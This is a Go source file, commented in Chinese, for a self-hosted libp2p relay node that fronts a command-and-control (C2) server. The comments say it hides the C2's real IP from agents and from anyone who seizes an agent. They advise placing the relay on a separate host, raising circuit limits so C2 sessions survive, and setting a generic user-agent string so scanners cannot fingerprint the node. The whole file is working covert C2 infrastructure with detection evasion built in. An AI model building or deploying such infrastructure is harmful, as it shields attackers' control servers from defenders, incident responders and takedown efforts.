// axrelay —— gopher listener/agent 的 libp2p circuit v2 relay 节点（批次5 交付物）。
//
// ## 它解决什么
//
// C2 躲在 relay 后面时，agent 手里只会有 `<relay>/p2p-circuit/p2p/<c2id>` 这样的地址
// ⇒ agent（以及拿到 agent 的人）看不到 C2 的真实 IP。代价是**必须有人当 relay**，
// 而 relay 一旦是第三方公共节点，等于把"C2 的 peer id + 全时段流量"交给别人。
// 本程序就是自建的那一个。
//
// ## 三个非做不可的点（每一条都有实测依据）
//
//  1. **`ForceReachabilityPublic()` 不能省。**
//     relaysvc 只在 `ReachabilityPublic` 事件上才建 relay；不加这句，进程会稳稳地跑着、
//     端口在听、**却一台预约都不接受**，且不报错。
//
//  2. **限额必须放宽。**
//     `relayv2.DefaultLimit()` = `Duration: 2*time.Minute, Data: 1<<17`（128 KiB）。
//     实测（唯一变量就是限额）：默认档传 200000 B ⇒ `read=0 err=stream reset`；
//     放宽到 1h/1GiB ⇒ `read=200000 err=<nil>`。C2 会话**必然**超过 128 KiB，
//     所以照默认档跑出来的现象是"能连上、几十秒到几分钟后随机断"，极难归因。
//     ★ 放宽 relay 只是一半：C2 侧还必须把 `Reservation.LimitData/LimitDuration`
//     设成不比这里小（relayv2 的限额是**协商**出来的）。
//
//  3. **身份必须持久化。**
//     peer id 是 relay 地址 `<addr>/p2p/<id>` 的一部分。用临时身份的话，relay 重启一次，
//     C2 侧配置里的 l2p_relays 与所有已发出的 agent 地址**同时失效**，
//     而现象是"C2 起不来/agent 连不上"，与配置写错完全同形。
//
// ## 部署（详见同目录 README.md）
//
//	★ relay 要跑在**另一台**机器上（或至少另一个 IP）：与 C2 同机则 C2 的真实 IP
//	  可以从 relay 的流量里直接读出来，隐藏就白做了。
//	★ 只需要对外开 TCP 一个端口（默认 4446）。
//
// 用法：
//
//	axrelay -listen /ip4/0.0.0.0/tcp/4446 -key /etc/axrelay/relaynode.key
//
// 启动后打印的 `NODE-ADDR` 行原样填进 C2 的 l2p_relays（一行一条，可多条互为备份）。
package main

import (
	"context"
	"crypto/rand"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/libp2p/go-libp2p"
	libcrypto "github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/p2p/muxer/yamux"
	relayv2 "github.com/libp2p/go-libp2p/p2p/protocol/circuitv2/relay"
	"github.com/libp2p/go-libp2p/p2p/security/noise"
	"github.com/libp2p/go-libp2p/p2p/transport/tcp"
)

// 本节点的**约定值** —— 刻意不同于上游默认值：`relayv2.DefaultLimit()` 是
// 2m/128KiB，实测会把 C2 会话掐断（`read=0 err=stream reset`）。见文件头 2.。
// 提成常量是为了让 relaynode_test.go 能判"约定值有没有被改回默认档"。
const (
	defLimitData      = 1 << 30
	defLimitDuration  = time.Hour
	defReservationTTL = 2 * time.Hour
	// defMaxCircuits/defMaxReservations 高于上游默认的 128：一个 C2 只占 1 个预约，
	// 但留余量以免多 listener / 重连风暴时被静默拒绝。
	defMaxCircuits     = 512
	defMaxReservations = 512
	// axLibp2pUserAgent 见 agent 侧 transport_libp2p.go 的同名常量（同一取值纪律）。
	// ★ relaynode 是**最可能被公网扫到/被拨**的那个（relay 服务器本就暴露在外），
	//   它的 identify 指纹比另两处更早、更容易被记录，默认值同样是自曝串。
	// ★ 三处必须逐字节相同，由 l2p_uafix.py verify 判。
	axLibp2pUserAgent = "go-libp2p"
)

func main() {
	listen := flag.String("listen", "/ip4/0.0.0.0/tcp/4446",
		"relay 监听地址（multiaddr；多个用逗号分隔）")
	keyPath := flag.String("key", "relaynode.key",
		"身份私钥文件；不存在则生成。★ 必须保留，换了它所有 C2 配置与 agent 地址一起失效")
	limData := flag.Int64("limit-data", defLimitData,
		"单 circuit 数据上限（字节）。上游默认 1<<17 = 128 KiB，会把 C2 会话掐断")
	limDur := flag.Duration("limit-duration", defLimitDuration,
		"单 circuit 时长上限。上游默认 2m，会把 C2 会话掐断")
	maxCirc := flag.Int("max-circuits", defMaxCircuits, "并发 circuit 上限（上游默认 128）")
	maxRsv := flag.Int("max-reservations", defMaxReservations, "并发预约上限（上游默认 128）")
	rsvTTL := flag.Duration("reservation-ttl", defReservationTTL,
		"预约有效期。C2 侧按 Expiration/2 续约，所以这个值决定续约频率")
	flag.Parse()

	if err := run(*listen, *keyPath, *limData, *limDur, *maxCirc, *maxRsv, *rsvTTL); err != nil {
		fmt.Fprintf(os.Stderr, "NODE-ERR %v\n", err)
		os.Exit(1)
	}
}

func run(listen, keyPath string, limData int64, limDur time.Duration,
	maxCirc, maxRsv int, rsvTTL time.Duration) error {

	sk, gen, err := loadOrCreateKey(keyPath)
	if err != nil {
		return fmt.Errorf("身份: %w", err)
	}
	if gen {
		fmt.Printf("NODE-KEY 已生成新身份并写入 %s（0600）—— 请备份，丢了等于换节点\n", keyPath)
	}

	res := newResources(limData, limDur, maxCirc, maxRsv, rsvTTL)

	h, err := newRelayHost(splitAddrs(listen), sk, res)
	if err != nil {
		return fmt.Errorf("建 host: %w", err)
	}
	defer h.Close()

	fmt.Printf("NODE-PEER %s\n", h.ID())
	addrs := h.Addrs()
	if len(addrs) == 0 {
		return fmt.Errorf("host 没有任何监听地址（-listen 写错了？）")
	}
	for _, a := range addrs {
		// 这一行就是 C2 侧 l2p_relays 该填的内容。
		fmt.Printf("NODE-ADDR %s/p2p/%s\n", a, h.ID())
	}
	fmt.Printf("NODE-LIMIT data=%d duration=%s circuits=%d reservations=%d reservationTTL=%s\n",
		res.Limit.Data, res.Limit.Duration, res.MaxCircuits, res.MaxReservations, res.ReservationTTL)
	fmt.Printf("NODE-READY 把上面每条 NODE-ADDR 原样填进 C2 的 l2p_relays；"+
		"C2 侧 LimitData 不得小于 %d、LimitDuration 不得小于 %s\n", res.Limit.Data, res.Limit.Duration)
	_ = os.Stdout.Sync()

	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer stop()
	<-ctx.Done()
	fmt.Println("NODE-STOP 收到信号，退出")
	return nil
}

// newResources 只改限额与配额，其余（MaxSize 等）沿用 DefaultResources()：
// ★ 从零值构造 Resources 会让 MaxReservations=0 ⇒ 谁都预约不上，且**不报错**。
func newResources(limData int64, limDur time.Duration, maxCirc, maxRsv int,
	rsvTTL time.Duration) relayv2.Resources {
	res := relayv2.DefaultResources()
	res.Limit = &relayv2.RelayLimit{Duration: limDur, Data: limData}
	res.MaxCircuits = maxCirc
	res.MaxReservations = maxRsv
	res.ReservationTTL = rsvTTL
	return res
}

// newRelayHost 按本节点的固定形态建 host。
//
// ★ 抽成函数是为了让测试能**直接驱动这份真配置**（relaynode_test.go 起的就是它），
// 而不是在测试里再抄一份选项 —— 抄件会漂移，漂移了还照样绿。
func newRelayHost(listen []string, sk libcrypto.PrivKey, res relayv2.Resources) (host.Host, error) {
	// ★ 选项顺序有讲究：NoTransports 会清空已登记的传输，所以 Transport() 必须在它之后；
	//   可达性声明与 relay 服务放最后便于阅读。
	opts := []libp2p.Option{
		libp2p.ListenAddrStrings(listen...),
		libp2p.Identity(sk),
		libp2p.NoTransports,
		libp2p.Transport(tcp.NewTCPTransport),
		libp2p.Security(noise.ID, noise.New),
		libp2p.Muxer(yamux.ID, yamux.DefaultTransport),
		// ★ 批次8：identify 报出的 agentVersion（见 axLibp2pUserAgent 定义处）。
		libp2p.UserAgent(axLibp2pUserAgent),
		// ★ 见文件头 1.：没有这句，relay 服务永远不启动，且毫无提示。
		libp2p.ForceReachabilityPublic(),
		libp2p.EnableRelayService(relayv2.WithResources(res)),
	}
	return libp2p.New(opts...)
}

// loadOrCreateKey 返回 (私钥, 是否新生成)。文件权限 0600。
func loadOrCreateKey(path string) (libcrypto.PrivKey, bool, error) {
	if b, err := os.ReadFile(path); err == nil {
		sk, uerr := libcrypto.UnmarshalPrivateKey(b)
		if uerr != nil {
			return nil, false, fmt.Errorf("解析 %s: %w", path, uerr)
		}
		return sk, false, nil
	} else if !os.IsNotExist(err) {
		return nil, false, err
	}
	sk, _, err := libcrypto.GenerateEd25519Key(rand.Reader)
	if err != nil {
		return nil, false, err
	}
	b, err := libcrypto.MarshalPrivateKey(sk)
	if err != nil {
		return nil, false, err
	}
	if err := os.WriteFile(path, b, 0600); err != nil {
		return nil, false, fmt.Errorf("写 %s: %w", path, err)
	}
	return sk, true, nil
}

// splitAddrs 支持 `-listen a,b`；全空则回落到默认地址（flag 默认值被显式清空的情形）。
func splitAddrs(s string) []string {
	var out []string
	for _, p := range strings.Split(s, ",") {
		if p = strings.TrimSpace(p); p != "" {
			out = append(out, p)
		}
	}
	if len(out) == 0 {
		out = []string{"/ip4/0.0.0.0/tcp/4446"}
	}
	return out
}
